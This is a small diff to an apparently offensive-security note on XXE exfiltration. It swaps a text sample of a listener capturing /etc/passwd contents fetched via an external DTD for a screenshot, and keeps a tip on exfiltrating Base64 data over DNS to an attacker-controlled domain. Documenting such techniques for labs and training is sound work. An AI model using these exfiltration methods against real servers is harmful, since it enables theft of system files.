@@ -651,10 +651,7 @@ Send as POST to:
 
 **4. Example Output on Listener**
 
-<pre>10.10.14.16:46256 /xxe.dtd
-root:x:0:0:root:/root:/bin/bash
-daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
-...SNIP...</pre>
+<img width="518" height="128" alt="image" src="https://github.com/user-attachments/assets/d3b0d450-147f-4744-9932-936a5dc8bfc1" />
 
 Tip: Instead of sending data in the URL parameter, you can use DNS exfiltration
 (e.g., <BASE64>.our-domain.com) and capture traffic with tcpdump.
